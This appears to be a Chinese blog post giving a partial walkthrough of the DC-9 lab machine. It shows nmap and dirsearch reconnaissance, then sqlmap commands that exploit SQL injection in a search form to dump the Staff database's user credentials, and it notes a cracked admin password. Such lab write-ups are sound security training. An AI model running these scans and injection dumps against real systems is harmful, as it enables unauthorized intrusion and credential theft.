@@ -1,0 +1,657 @@
+
+<!DOCTYPE html><html lang="-zh-CN -en -zh-TW">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>DC-9 - 菜站</title>
+
+  
+    <meta name="description" content="信息收集主机扫描1ip a   1nmap -sP 192.168.217.129&#x2F;24   端口扫描1nmap 192.168.217.137   注意到ssh服务端口是filtered的，可能是什么原因给关掉了 目录扫描1dirsearch -u 192.168.217.137 -e * -x 403 --random-agent   页面探测暂时无图 探测结果： 发现Search页面搜索存在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-9">
+<meta property="og:url" content="https://coolajui.github.io/2024/04/01/DC-9/index.html">
+<meta property="og:site_name" content="菜站">
+<meta property="og:description" content="信息收集主机扫描1ip a   1nmap -sP 192.168.217.129&#x2F;24   端口扫描1nmap 192.168.217.137   注意到ssh服务端口是filtered的，可能是什么原因给关掉了 目录扫描1dirsearch -u 192.168.217.137 -e * -x 403 --random-agent   页面探测暂时无图 探测结果： 发现Search页面搜索存在">
+<meta property="og:locale">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YWRhZmQ2NTIwMTEyMzlmMTk5NGNmNjAzNDJkMmExZDJfOGs5UDEwTUFnbmdITlVNamc3dkRHeWVjRDF3aXpDNHhfVG9rZW46VVJNM2I4WVF1b0pHVzZ4c1NFSmMxVE45bjFlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjgxNzc2ZDY4NGRkYjcwZjk3MTcwYjc3YTQ5ZjFjZjRfZDI2YmZJSklxV1M5dURvVE12SEtzQjVJZXdUN2hHSHRfVG9rZW46V3hwMmJQdkpFb0FZZWZ4cVRzQ2M3WkIwbmxoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmJjODRiYTUzZDViNjI2YzA0YjQ4NjA4YmM3OTRiMzZfWHpHcERWcW1ZRWdLUkgwZGxaMlZ3cTNUYXdFdHpJWDZfVG9rZW46QU1vWmJFek1zb0s2aGF4eW1nSWNCZVV5bkRoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY2NGViMGQxYTBiZDRjZGZlM2Q3MDlkZDZmMmIyMjVfMU56Vms5R3NmNUZIdFE4N29Ua1NxbUNXSVFSQ2k2OGZfVG9rZW46SDhvR2I5Sm1yb0xRTTR4SURORmNLMU9CbnJnXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA0ZGEyMjgzZDM2MGRhZThjNDQ4YzY4MjU1MTAwMGFfeFMwUmQ1M0VYMFpZbWswNXdoQUMxWjA0VEQyWWVmdXBfVG9rZW46WTRUNWJjUGt5b3p2R2t4Vzd6dmNTQ0N1bjdjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmZlNWE3Mzc4NDJhYTlkNzkwZTUxZWRkZGI2YjQwMmJfYlRETGVaTHFLYWlDdTdGa1lLcG5tdlhjcjZ3TDhDaTJfVG9rZW46RWk3Y2JaY2Vpb2xkTHV4SFJQMmM0bWxMbnBiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ODFjZDAwNDUwODc3ZGM0ZTFjNWNkZmYxYzY1OTAzZmFfT2lBb0FhVmtwRktUYklPMWZYMjlxSlVjUFVPcWdib1BfVG9rZW46T204SmJ6OGJvb1JmQWx4dlFiU2N5WWNxbnhjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMwNDA1Yzc5MTRjMzA3NTk3NDBiNzRiNGQyZjY3NWJfYmU4NkVXWFJWYk9aQVNyMDIwSExpSWE2N09sdzBna3ZfVG9rZW46TlVlMGJZRkhnb0JhcEh4a2g0RWNiWDJxbmdkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjg2NjAyMGVjNzBiY2Q5NjVlODM1NDUwNDMzNjgyODBfZFVqQlBuTzFIdEo2amRvWXRjVmVZTGRZcllnMUZLanNfVG9rZW46TXg0V2JXWFdRb3dBN054OVVxTmNBd1ZKbk5mXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDkyMTcxZWUyZTFkMjU2OGIzMDk4MmYxZTcxYjY3MDFfSW00cDBjVnNMaGZMb1N2Tnp4WjdhWGhYZFA4SVNEdWpfVG9rZW46SXc0aGJLaFNxb1RYREN4SnBsWmNEMUZEbnhmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Njk3MmVlMzI4ZTdiNjI4NDJjYzRjNGIwNjViYjk3OGJfblVqNkFmUHJXVFVmcjJJdVJsa2FsT0R0VXA3UXhzSHZfVG9rZW46V1V2N2JuN1VDb1F1V2N4S3lYN2NGTEVibjdiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjE3ODVhMzNmZjgzYjVkMzZmZjI5MWEyNTJjYjY5MzdfcUcxdlpKUEFoQlA4ZUxncFRLV3JIMHdqR0RseDEwSGZfVG9rZW46VTluTGJsVk5Cb1kwZ3Z4MTAwNWM5MjJVbkNkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MjU4NTM3MTE0MTE3NDY3ZDg3YTUzMGE0M2QwYTg4ZjhfazZkQUxkNkhlM1JwUVJvS1doMHg2ZTJzZ1VkUlRoOFRfVG9rZW46TTkzMmJaSjJKb3JJZU54U3hJdGNZa2ZFbnpjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQ4NjUwNzg2OTdhZTEwNWVlMDY5NDhhNWNhYmUxOGFfTGhEZ0ZSZWQwZ3c4SHhqckJGb2xIYkhHYkU3ZHl0S1hfVG9rZW46Sk50VGJueWtEb0Z0R1Z4QmV4NWNzRzJJbnNmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ3NjkzMGY0NzM4MGE4YWY1NDZmZjFiYWEzZGQzYTFfUWtmYkJvQW56ZTYxNlMxdVk1QXFSeUhUZGtmOGhpZGZfVG9rZW46WktlWmJJSWI3bzhQQ1N4TW5IdmNmSFdSbnVRXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM5MTNmOTY0ZWRiMGNkYTYyMWEzODI1MzAzYjJlMzZfdEpHTTl1NDJnSHg2N2pOa2FHa2s5STlNdHFYZDFQcjdfVG9rZW46VGlmcmJ1emszbzM2R0x4YzZXOWNpdmFPbkVoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg5N2ZmNTAwZjYxYTJkOGQ4MTNlMjI3MjAzOTE0YTNfSG5jTGxuaWhubGV2N2V5S3BnUWFWb3JQSUY1b0xwS0VfVG9rZW46QzY0b2JyaURxb3FMTGl4bkRKdGN4amdqbkxmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjk0NTBmZGExY2E4MGFjZGIwZjdiOTMyMjZmYjVmNDNfb2k5WXltRFlKUFBXSFM3T1YyV1I4ZHpTNGZOVUxWY2tfVG9rZW46UWo0N2JRa1Yxb2JUQXZ4anRBYWN0b2RNbjdmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MmExOGQxNTM5MGU3ODNiZjVkN2NmNWI3MDE0OGY4YWNfazRlSk5Od2kzOUVCS2w1ZjJDZmdYM1VNOGdrdW9PeUtfVG9rZW46TjR3VWJLN0Jpb1hXbG94ZlNUZWNzaEFSbmJWXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjJmMjMxYTQ2M2U0ZTM4MjNmMTFmNTg5MzY3N2FjNjlfcUF1akZyaEc3bEJGVlg0TThMQzRad3Jtem82UmJjM2JfVG9rZW46V1l0VGJLRHh3b3BxUll4YmhsUmNiWW9NbnNlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJlYzY5MWVlZDdkMGZkZmZhZTk5YjY2MTNhNjE1ZGFfVUZybjhkMkpPNkNEMTAzb1A4V0V4YkV0QXpBcXBvMHpfVG9rZW46TUJQTGJrZzI5b2hGREV4Vlkwd2NCSTN4bm1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjU3NTVlYjhhMTE2Y2E5ODQxNTFhMDFkYTUzNWZmODZfTEh4YVhoR0d4eTM5R3lvODNQbTlkcU9TNjlEbHljSVJfVG9rZW46RkpwbWJ0VjdRb2M5SFJ4cmk5YmNra3VsbnlmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE0NWQ1NzU2MDNjYjAzMTlmODIwMjExMjc1MDc1OGZfcXhnMnN4clQxOG56aFBrMGFqUHpFUmlXRld0ckJMMjBfVG9rZW46SUNYVWJFMDZ1b3hlUFZ4WlBCMGNSREo3bk1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjY3Y2FkZjM5ZDEzNWU3ZDc3MmQ1N2U0ZTFjYWYwMDlfVk1mZXNLSWtGZ0t3M1JiWlF0V3JlWHQ3RlNMRHNpUTlfVG9rZW46VlN1QmJaN3FMb3VuTE14VXg5MWNBUnFtblZjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY3NmY0YzMxNDMzYmMyMzM0MzcwMTI2ODJjODJhZjBfMnlQaTY4S010VmlKSUhmamdCSXNhQ2FPcVZhM1h0UGlfVG9rZW46S1hHU2I4VXFlb1Bza3l4V09HRmNGbmcwblA4XzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=M2NiOTg5OGY4MGQxZmRiNzQ2NjFmOGYyYWE4NDY0MmNfVjExVnd3REkzNjRMS0RhYU41RXdTRzBXM0l5cG5sOWdfVG9rZW46Vk53ZWJzVDhkbzh5OTR4WHN6emNRV001bjZlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="og:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA3YTlhZjdiZmYwOTBmNzg5MTUzMjhlZTg2YzNiYWZfdENoZGVkcVMydWs2OVZjQTVXZ2o0S2trT2hwNWxKQjBfVG9rZW46SEF3VWJCREgyb0hCUTJ4bEp2bWNsVElLbmxiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+<meta property="article:published_time" content="2024-03-31T16:10:31.000Z">
+<meta property="article:modified_time" content="2024-04-01T01:10:16.302Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YWRhZmQ2NTIwMTEyMzlmMTk5NGNmNjAzNDJkMmExZDJfOGs5UDEwTUFnbmdITlVNamc3dkRHeWVjRDF3aXpDNHhfVG9rZW46VVJNM2I4WVF1b0pHVzZ4c1NFSmMxVE45bjFlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="菜站" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+
+  
+
+  
+</head>
+<body>
+
+<div class="l_body s:aa index tech" id="start" layout="[layout]" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://pic1.zhimg.com/v2-dcda957b71759ebad5d2afaf3579bfb2_r.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">菜站</div><div class="sub cap">上班的动力是什么？ / 没钱~</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>
+
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets"></div>
+
+</div></aside><div class="l_main" id="main">
+
+<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://pic1.zhimg.com/v2-dcda957b71759ebad5d2afaf3579bfb2_r.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">菜站</div><div class="sub cap">上班的动力是什么？ / 没钱~</div></a></div></header>
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
+
+  <span class="sep"></span>
+  <a class="cap breadcrumb" href="/2024/04/01/DC-9/">DC-9</a>
+  </div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2024-03-31T16:10:31.000Z">2024-04-01</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2024-04-01T01:10:16.302Z">2024-04-01</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>DC-9</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YWRhZmQ2NTIwMTEyMzlmMTk5NGNmNjAzNDJkMmExZDJfOGs5UDEwTUFnbmdITlVNamc3dkRHeWVjRDF3aXpDNHhfVG9rZW46VVJNM2I4WVF1b0pHVzZ4c1NFSmMxVE45bjFlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.217.129/24</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjgxNzc2ZDY4NGRkYjcwZjk3MTcwYjc3YTQ5ZjFjZjRfZDI2YmZJSklxV1M5dURvVE12SEtzQjVJZXdUN2hHSHRfVG9rZW46V3hwMmJQdkpFb0FZZWZ4cVRzQ2M3WkIwbmxoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.217.137</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmJjODRiYTUzZDViNjI2YzA0YjQ4NjA4YmM3OTRiMzZfWHpHcERWcW1ZRWdLUkgwZGxaMlZ3cTNUYXdFdHpJWDZfVG9rZW46QU1vWmJFek1zb0s2aGF4eW1nSWNCZVV5bkRoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>注意到ssh服务端口是filtered的，可能是什么原因给关掉了</p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.217.137 -e * -x 403 --random-agent</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY2NGViMGQxYTBiZDRjZGZlM2Q3MDlkZDZmMmIyMjVfMU56Vms5R3NmNUZIdFE4N29Ua1NxbUNXSVFSQ2k2OGZfVG9rZW46SDhvR2I5Sm1yb0xRTTR4SURORmNLMU9CbnJnXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<h2 id="页面探测"><a href="#页面探测" class="headerlink" title="页面探测"></a>页面探测</h2><p>暂时无图</p>
+<p>探测结果：</p>
+<p>发现Search页面搜索存在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>（原因：在上传之后网址无任何变动，判断是post请求）</p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="SQ注入"><a href="#SQ注入" class="headerlink" title="SQ注入"></a>SQ注入</h2><p>知道注入点，接下来上sqlmap跑，POST传参search，爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; --current-db</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA0ZGEyMjgzZDM2MGRhZThjNDQ4YzY4MjU1MTAwMGFfeFMwUmQ1M0VYMFpZbWswNXdoQUMxWjA0VEQyWWVmdXBfVG9rZW46WTRUNWJjUGt5b3p2R2t4Vzd6dmNTQ0N1bjdjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>得到数据库后进行爆表&#x2F;数据库：Staff</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -tables</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmZlNWE3Mzc4NDJhYTlkNzkwZTUxZWRkZGI2YjQwMmJfYlRETGVaTHFLYWlDdTdGa1lLcG5tdlhjcjZ3TDhDaTJfVG9rZW46RWk3Y2JaY2Vpb2xkTHV4SFJQMmM0bWxMbnBiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -columns</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ODFjZDAwNDUwODc3ZGM0ZTFjNWNkZmYxYzY1OTAzZmFfT2lBb0FhVmtwRktUYklPMWZYMjlxSlVjUFVPcWdib1BfVG9rZW46T204SmJ6OGJvb1JmQWx4dlFiU2N5WWNxbnhjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>爆值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -C &#x27;Username,Password,UserID&#x27; -dump</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMwNDA1Yzc5MTRjMzA3NTk3NDBiNzRiNGQyZjY3NWJfYmU4NkVXWFJWYk9aQVNyMDIwSExpSWE2N09sdzBna3ZfVG9rZW46TlVlMGJZRkhnb0JhcEh4a2g0RWNiWDJxbmdkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>只有一位用户，还有密码，这密码一看就是md5，接下来找个在线网站解密<a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjg2NjAyMGVjNzBiY2Q5NjVlODM1NDUwNDMzNjgyODBfZFVqQlBuTzFIdEo2amRvWXRjVmVZTGRZcllnMUZLanNfVG9rZW46TXg0V2JXWFdRb3dBN054OVVxTmNBd1ZKbk5mXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>密码：transorbital1</p>
+<h2 id="登入后台"><a href="#登入后台" class="headerlink" title="登入后台"></a>登入后台</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDkyMTcxZWUyZTFkMjU2OGIzMDk4MmYxZTcxYjY3MDFfSW00cDBjVnNMaGZMb1N2Tnp4WjdhWGhYZFA4SVNEdWpfVG9rZW46SXc0aGJLaFNxb1RYREN4SnBsWmNEMUZEbnhmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
